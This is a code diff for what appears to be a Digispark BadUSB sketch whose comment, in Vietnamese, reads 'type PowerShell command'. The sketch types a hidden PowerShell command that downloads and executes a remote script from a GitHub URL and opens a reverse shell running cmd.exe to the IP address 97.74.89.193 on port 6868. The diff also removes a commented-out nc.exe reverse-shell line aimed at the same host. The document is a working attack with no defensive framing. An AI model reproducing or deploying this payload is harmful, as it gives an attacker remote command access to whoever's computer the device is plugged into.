@@ -19,8 +19,7 @@ void setup() {
   // Gõ lệnh PowerShell
  DigiKeyboard.println("powershell -W hidden -c "IEX(New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/huyremy/netcat/main/power.ps1');huyremy -c 97.74.89.193 -p 6868 -e cmd.exe");
  DigiKeyboard.delay(1000);
- //DigiKeyboard.println("START /MIN nc.exe 97.74.89.193 6868 -e cmd.exe -d & exit");
-  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+DigiKeyboard.sendKeyStroke(KEY_ENTER);
 }
 
 void loop() {
